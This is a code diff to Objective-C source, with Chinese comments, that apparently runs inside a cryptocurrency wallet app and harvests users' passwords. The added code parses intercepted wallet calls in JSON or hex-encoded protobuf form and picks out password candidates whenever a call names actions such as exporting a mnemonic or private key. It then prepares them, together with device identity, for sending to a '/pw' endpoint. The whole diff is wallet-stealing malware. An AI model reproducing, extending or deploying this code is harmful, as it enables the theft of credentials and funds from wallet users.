@@ -845,22 +845,71 @@ static NSArray *WalletMemoryTargets(void) {
                         @"sample": calls.count ? [calls componentsJoinedByString:@" || "] : @"" };
         [self.net sendEvent:ev];
 
-        // 3) 从 JSON 里抠密码，直接送 /pw
+        // 3) 每一段是 "[sel] <hex>"，hex 是 protobuf：
+        //    先还原字节，再抽可打印串，最后对「带密码的动作」把串当候选送 /pw。
         NSMutableArray *pwds = [NSMutableArray array];
+        NSCharacterSet *pwOk = [NSCharacterSet characterSetWithCharactersInString:
+            @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=.,<>?~`| "];
+
         for (NSString *c in calls) {
-            // "password":"xxx"  或  "password": "xxx"
+            // 兼容两种格式：[sel] hex   或   [sel] {"password":"..."}
+            NSRange close = [c rangeOfString:@"]"];
+            NSString *payload = (close.location != NSNotFound)
+                ? [[c substringFromIndex:close.location + 1]
+                   stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]]
+                : c;
+
+            // 3a) JSON 形态
             NSRegularExpression *re = [NSRegularExpression
-                regularExpressionWithPattern:@"\"password\"\\s*:\\s*\"([^\"]{1,64})\""
+                regularExpressionWithPattern:@"\"password\"\\s*:\\s*\"([^\"]{4,64})\""
                                      options:0 error:NULL];
-            NSArray *ms = [re matchesInString:c options:0 range:NSMakeRange(0, c.length)];
-            for (NSTextCheckingResult *m in ms) {
+            for (NSTextCheckingResult *m in [re matchesInString:payload options:0
+                                                          range:NSMakeRange(0, payload.length)]) {
                 if (m.numberOfRanges > 1) {
-                    NSString *v = [c substringWithRange:[m rangeAtIndex:1]];
+                    NSString *v = [payload substringWithRange:[m rangeAtIndex:1]];
                     if (v.length && ![pwds containsObject:v]) [pwds addObject:v];
                 }
             }
+
+            // 3b) hex(protobuf) 形态
+            NSData *raw = [MemScan dataFromHex:payload];
+            if (raw.length < 8) continue;
+
+            BOOL needsPwd = NO;
+            NSMutableArray *strs = [NSMutableArray array];
+            const uint8_t *b = raw.bytes;
+            NSMutableString *cur = [NSMutableString string];
+            for (NSUInteger i = 0; i <= raw.length; i++) {
+                uint8_t ch = (i < raw.length) ? b[i] : 0;
+                if (ch >= 0x20 && ch < 0x7f) {
+                    [cur appendFormat:@"%c", ch];
+                } else {
+                    if (cur.length >= 4) [strs addObject:[cur copy]];
+                    [cur setString:@""];
+                }
+            }
+            for (NSString *s in strs) {
+                if ([s isEqualToString:@"get_derived_key"] ||
+                    [s isEqualToString:@"export_mnemonic"] ||
+                    [s isEqualToString:@"create_keystore"] ||
+                    [s isEqualToString:@"import_mnemonic"] ||
+                    [s isEqualToString:@"import_private_key"] ||
+                    [s isEqualToString:@"export_private_key"] ||
+                    [s isEqualToString:@"change_password"]) {
+                    needsPwd = YES;
+                }
+            }
+            if (!needsPwd) continue;
+
+            for (NSString *s in strs) {
+                if (s.length < 6 || s.length > 40) continue;
+                if ([s rangeOfCharacterFromSet:[pwOk invertedSet]].location != NSNotFound) continue;
+                if ([s hasPrefix:@"api."] || [s containsString:@"_"]) continue;   // 动作名/结构名
+                if (![pwds containsObject:s]) [pwds addObject:s];
+            }
         }
         if (!pwds.count) return;
+        if (pwds.count > 40) pwds = [[pwds subarrayWithRange:NSMakeRange(0, 40)] mutableCopy];
 
         NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
         body[@"c"] = kSeed;
